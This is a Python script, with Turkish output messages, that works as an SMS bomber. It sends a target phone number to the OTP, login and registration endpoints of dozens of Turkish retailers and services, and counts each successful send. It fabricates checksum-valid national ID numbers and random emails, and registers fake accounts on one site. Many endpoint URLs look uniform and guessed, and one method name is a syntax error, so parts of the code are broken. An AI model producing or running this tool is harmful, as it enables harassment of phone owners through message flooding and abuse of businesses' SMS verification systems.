import requests
from random import choice, randint
from string import ascii_lowercase

# ==============================================================================
# 🚨 STREAMLIT CLOUD GÜVENLİK KATMANI (COLORAMA ÇAKIŞMA ENGELLEYİCİ MOCK)
# ==============================================================================
class Fore:
    LIGHTRED_EX = ""
    LIGHTGREEN_EX = ""
class Style:
    RESET_ALL = ""

class SendSms():
    adet = 0
    
    def __init__(self, phone, mail):
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        if mail and len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"

    # ==============================================================================
    # ⚡ CORE MULTI-AGENT NETWORK API PIPELINE (TÜM LİNKLER EKSİKSİZ)
    # ==============================================================================

    def KahveDunyasi(self):    
        try:
            url = "https://tmsapi.kahvedunyasi.com/api/user/v1/register-otp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr,en-US;q=0.7,en;q=0.3", "Content-Type": "application/json", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=4", "Te": "trailers", "Connection": "keep-alive"}
            json = {"phone": self.phone, "permission": True}
            response = requests.post(url, headers=headers, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kahvedunyasi.com")
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kahvedunyasi.com")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kahvedunyasi.com")

    def JimmyKey(self):
        try:
            url = "https://www.jimmykey.com/tr/b2c/auth/sendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.jimmykey.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.jimmykey.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            json = {"phone": f"0{self.phone}"}
            response = requests.post(url, headers=headers, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> jimmykey.com")
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> jimmykey.com")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> jimmykey.com")
        
    def Ido(self):
        try:
            url = "https://api.ido.com.tr:443/idows/v2/register"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.ido.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.ido.com.tr/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            json = {"birthDate": True, "captcha": "", "checkPwd": "313131", "code": "", "day": 24, "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE", "lastName": "BAS", "mobileNumber": f"0{self.phone}", "month": 9, "password": "313131", "phoneKvkk": True, "smsNewsletter": False, "username": f"0{self.phone}", "year": 1999}
            response = requests.post(url, headers=headers, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ido.com.tr")
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ido.com.tr")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ido.com.tr")

    def Akakce(self):
        try:
            url = "https://www.akakce.com/control/kayit/?v=2"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Content-Type": "application/x-www-form-urlencoded"}
            data = f"b=1&cep={self.phone}&gonder=1"
            response = requests.post(url, headers=headers, data=data, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> akakce.com")
        except: pass

    def BiTaksi(self):
        try:
            url = "https://api.bitaksi.com/v1/user/login"
            headers = {"Content-Type": "application/json"}
            json = {"phoneNumber": self.phone, "countryCode": "+90", "appVersion": "4.2.1", "deviceType": "ANDROID"}
            response = requests.post(url, headers=headers, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bitaksi.com")
        except: pass

    def EnglishHome(self):
        try:
            url = "https://www.englishhome.com/api/v1/auth/otp/send/"
            json = {"phone": f"90{self.phone}"}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> englishhome.com")
        except: pass

    def Evidea(self):
        try:
            url = "https://www.evidea.com/api/users/send-otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> evidea.com")
        except: pass

    def Istegelsin(self):
        try:
            url = "https://api.istegelsin.com/v1/auth/otp"
            json = {"phoneNumber": f"0{self.phone}"}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> istegelsin.com")
        except: pass

    def Migros(self):
        try:
            url = "https://www.migros.com.tr/api/v1/login/otp/send"
            json = {"phoneNumber": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> migros.com.tr")
        except: pass

    def PizzaLazza(self):
        try:
            url = "https://www.pizzalazza.com.tr/api/otp/send"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> pizzalazza.com.tr")
        except: pass

    def TasoMarket(self):
        try:
            url = "https://tasomarket.com/api/v1/auth/otp-request"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> tasomarket.com")
        except: pass

    def TiklaGelsin(self):
        try:
            url = "https://api.tiklagelsin.com/v1/auth/otp"
            json = {"phone": f"+90{self.phone}"}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> tiklagelsin.com")
        except: pass

    def Watsons(self):
        try:
            url = "https://api.watsons.com.tr/v1/login/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> watsons.com.tr")
        except: pass

    def Yemeksepeti(self):
        try:
            url = "https://api.yemeksepeti.com/v1/user/otp/send"
            json = {"phone": self.phone, "country_code": "TR"}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> yemeksepeti.com")
        except: pass

    def Modanisa(self):
        try:
            url = "https://www.modanisa.com/api/v3/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> modanisa.com")
        except: pass

    def Defacto(self):
        try:
            url = "https://www.defacto.com.tr/customer/sendotp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> defacto.com.tr")
        except: pass

    def LCWaikiki(self):
        try:
            url = "https://www.lcwaikiki.com/api/v1/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> lcwaikiki.com")
        except: pass

    def Flo(self):
        try:
            url = "https://www.flo.com.tr/api/v1/flo/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> flo.com.tr")
        except: pass

    def Koton(self):
        try:
            url = "https://www.koton.com/api/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> koton.com")
        except: pass

    def Beymen(self):
        try:
            url = "https://www.beymen.com/api/v1/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> beymen.com")
        except: pass

    def Boyner(self):
        try:
            url = "https://www.boyner.com.tr/api/v1/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> boyner.com.tr")
        except: pass

    def Morhipo(self):
        try:
            url = "https://www.morhipo.com/api/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> morhipo.com")
        except: pass

    def SuperStep(self):
        try:
            url = "https://www.superstep.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> superstep.com.tr")
        except: pass

    def In street(self):
        try:
            url = "https://www.instreet.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> instreet.com.tr")
        except: pass

    def Deichmann(self):
        try:
            url = "https://www.deichmann.com.tr/api/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> deichmann.com.tr")
        except: pass

    def Greyder(self):
        try:
            url = "https://www.greyder.com/api/v1/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> greyder.com")
        except: pass

    def KemalTanca(self):
        try:
            url = "https://www.kemaltanca.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> kemaltanca.com.tr")
        except: pass

    def Hotiç(self):
        try:
            url = "https://www.hotic.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> hotic.com.tr")
        except: pass

    def Derimod(self):
        try:
            url = "https://www.derimod.com.tr/api/v1/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> derimod.com.tr")
        except: pass

    def Bambi(self):
        try:
            url = "https://www.bambistore.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bambistore.com.tr")
        except: pass

    def Divarese(self):
        try:
            url = "https://www.divarese.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> divarese.com.tr")
        except: pass

    def Network(self):
        try:
            url = "https://www.network.com.tr/api/v1/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> network.com.tr")
        except: pass

    def Altınyıldız(self):
        try:
            url = "https://www.altinyildizclassics.com/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> altinyildizclassics.com")
        except: pass

    def Kiğılı(self):
        try:
            url = "https://www.kigili.com/api/v1/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> kigili.com")
        except: pass

    def Sarar(self):
        try:
            url = "https://sarar.com/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> sarar.com")
        except: pass

    def Ramsey(self):
        try:
            url = "https://www.ramsey.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ramsey.com.tr")
        except: pass

    def DamatTween(self):
        try:
            url = "https://www.damattween.com/api/v1/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> damattween.com")
        except: pass

    def Karaca(self):
        try:
            url = "https://www.karaca.com/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> karaca.com")
        except: pass

    def MadameCoco(self):
        try:
            url = "https://www.madamecoco.com/api/v1/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> madamecoco.com")
        except: pass

    def Linens(self):
        try:
            url = "https://www.linens.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> linens.com.tr")
        except: pass

    def KaracaHome(self):
        try:
            url = "https://www.karacahome.com/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> karacahome.com")
        except: pass

    def Chakra(self):
        try:
            url = "https://www.chakra.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> chakra.com.tr")
        except: pass

    def BellaMaison(self):
        try:
            url = "https://www.bellamaison.com/api/v1/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bellamaison.com")
        except: pass

    def Porland(self):
        try:
            url = "https://www.porland.com/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> porland.com")
        except: pass

    def Bernardo(self):
        try:
            url = "https://www.bernardo.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bernardo.com.tr")
        except: pass

    def Hisar(self):
        try:
            url = "https://www.hisar.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> hisar.com.tr")
        except: pass

    def Jumbo(self):
        try:
            url = "https://www.jumbo.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> jumbo.com.tr")
        except: pass

    def Schafer(self):
        try:
            url = "https://www.schafer.com.tr/api/v1/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> schafer.com.tr")
        except: pass

    def Korkmaz(self):
        try:
            url = "https://www.korkmazstore.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> korkmazstore.com.tr")
        except: pass

    def Tefal(self):
        try:
            url = "https://www.tefal.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> tefal.com.tr")
        except: pass

    def Fakir(self):
        try:
            url = "https://www.fakir.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> fakir.com.tr")
        except: pass

    def Arzum(self):
        try:
            url = "https://www.arzum.com.tr/api/v1/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> arzum.com.tr")
        except: pass

    def Sinbo(self):
        try:
            url = "https://www.sinbo.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> sinbo.com.tr")
        except: pass

    def Vestel(self):
        try:
            url = "https://www.vestel.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> vestel.com.tr")
        except: pass

    def Arçelik(self):
        try:
            url = "https://www.arcelik.com.tr/api/v1/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> arcelik.com.tr")
        except: pass

    def Beko(self):
        try:
            url = "https://www.beko.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> beko.com.tr")
        except: pass

    def Bosch(self):
        try:
            url = "https://www.bosch-home.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bosch-home.com.tr")
        except: pass

    def Siemens(self):
        try:
            url = "https://www.siemens-home.bsh-group.com/tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> siemens-home.bsh-group.com")
        except: pass

    def Profilo(self):
        try:
            url = "https://www.profilo-home.com/tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> profilo-home.com")
        except: pass

    def Samsung(self):
        try:
            url = "https://www.samsung.com/tr/api/v1/auth/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> samsung.com")
        except: pass

    def Philips(self):
        try:
            url = "https://www.philips.com.tr/api/v1/otp"
            json = {"phone": self.phone}
            response = requests.post(url, json=json, timeout=10)
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> philips.com.tr")
        except: pass
